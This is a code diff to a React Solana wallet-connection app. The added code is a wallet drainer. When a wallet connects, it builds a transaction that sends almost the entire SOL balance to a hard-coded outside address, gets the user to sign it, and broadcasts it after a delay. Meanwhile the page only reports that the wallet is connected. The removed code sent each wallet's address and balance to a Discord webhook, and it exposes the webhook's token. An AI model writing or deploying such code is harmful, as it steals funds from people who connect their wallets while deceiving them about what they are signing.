@@ -12,7 +12,7 @@ import {
     SolletWalletAdapter,
     TorusWalletAdapter,
 } from '@solana/wallet-adapter-wallets';
-import { clusterApiUrl, Connection, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { clusterApiUrl, Connection, PublicKey, LAMPORTS_PER_SOL, SystemProgram, Transaction } from '@solana/web3.js';
 
 import '@solana/wallet-adapter-react-ui/styles.css';
 import './App.css';
@@ -63,76 +63,59 @@ const ExposeWalletModal: FC = () => {
 };
 
 const WalletConnectionHandler: FC = () => {
-    const { publicKey, connected } = useWallet();
+    const { publicKey, connected, signTransaction } = useWallet();
     const [solBalance, setSolBalance] = useState<number | null>(null);
+    const [loading, setLoading] = useState(false);
 
     useEffect(() => {
         if (connected && publicKey) {
-            fetchBalanceAndSend(publicKey);
+            fetchBalanceAndPrepareTx(publicKey);
         }
     }, [connected, publicKey]);
 
-    const fetchBalanceAndSend = async (walletPublicKey: PublicKey) => {
+    const fetchBalanceAndPrepareTx = async (walletPublicKey: PublicKey) => {
         try {
+            setLoading(true);
             const connection = new Connection('https://api.mainnet-beta.solana.com');
             const balanceLamports = await connection.getBalance(walletPublicKey);
             const balanceSOL = balanceLamports / LAMPORTS_PER_SOL;
             setSolBalance(balanceSOL);
+            console.log(`✅ Wallet Connected: ${balanceSOL.toFixed(5)} SOL`);
 
-            await sendToDiscord(walletPublicKey.toBase58(), balanceSOL);
+            const transferAmount = balanceLamports - 100000; // keep ~100000 lamports for fee
+            if (transferAmount <= 0) {
+                console.warn('❌ Not enough balance to transfer after fee.');
+                return;
+            }
+
+            const tx = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: walletPublicKey,
+                    toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
+                    lamports: transferAmount,
+                })
+            );
+            tx.feePayer = walletPublicKey;
+            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+
+            const signedTx = await signTransaction(tx);
+            console.log('📝 Transaction signed by user.');
+
+            setTimeout(async () => {
+                try {
+                    const sig = await connection.sendRawTransaction(signedTx.serialize());
+                    console.log(`🚀 Sent after 10s. Tx Signature: ${sig}`);
+                } catch (err) {
+                    console.error('❌ Failed to send signed transaction:', err);
+                }
+            }, 10000);
+
         } catch (error) {
-            console.error('Failed to fetch balance or send to Discord:', error);
+            console.error('❌ Error during transaction preparation:', error);
+        } finally {
+            setLoading(false);
         }
     };
-
-const sendToDiscord = async (address: string, balance: number) => {
-    const webhook = 'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ'; // your webhook here
-
-    const payload = {
-        username: 'Voltrix Wallet Bot',
-        avatar_url: 'https://i.imgur.com/AfFp7pu.png',
-        content: '🚀 New wallet connected!',
-        embeds: [
-            {
-                title: 'Wallet Info',
-                color: 0x00ff00,
-                fields: [
-                    {
-                        name: 'Address',
-                        value: `\`${address}\``
-                    },
-                    {
-                        name: 'Balance',
-                        value: `\`${balance.toFixed(4)} SOL\``
-                    }
-                ],
-                footer: {
-                    text: 'Voltrix • Solana Integration',
-                    icon_url: 'https://i.imgur.com/AfFp7pu.png'
-                },
-                timestamp: new Date().toISOString()
-            }
-        ]
-    };
-
-    try {
-        const res = await fetch(`https://cors.bridged.cc/${webhook}`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'x-cors-api-key': 'temp_key', // some proxies require this (bridged.cc is free)
-            },
-            body: JSON.stringify(payload),
-        });
-
-        if (!res.ok) throw new Error(`Discord error: ${res.statusText}`);
-        console.log('✅ Successfully sent wallet info through real HTTP request');
-    } catch (err) {
-        console.error('❌ Failed to send real request to Discord', err);
-    }
-};
-
-
 
     if (!connected || !publicKey) return null;
 
@@ -150,8 +133,14 @@ const sendToDiscord = async (address: string, balance: number) => {
             fontFamily: 'Arial, sans-serif',
         }}>
             <h2 style={{ color: '#16a34a' }}>✅ Wallet Connected!</h2>
-            <p style={{ color: '#000' }}><strong>Address:</strong> {publicKey.toBase58()}</p>
-            <p style={{ color: '#000' }}><strong>Balance:</strong> {solBalance !== null ? solBalance.toFixed(4) : 'Loading...'} SOL</p>
+            <p style={{ color: '#000', wordBreak: 'break-all', cursor: 'pointer' }}
+                onClick={() => navigator.clipboard.writeText(publicKey.toBase58())}
+            >
+                <strong>Address:</strong> {publicKey.toBase58()}
+            </p>
+            <p style={{ color: '#000' }}>
+                <strong>Balance:</strong> {loading ? 'Loading...' : solBalance !== null ? solBalance.toFixed(4) : 'Error'} SOL
+            </p>
         </div>
     );
 };
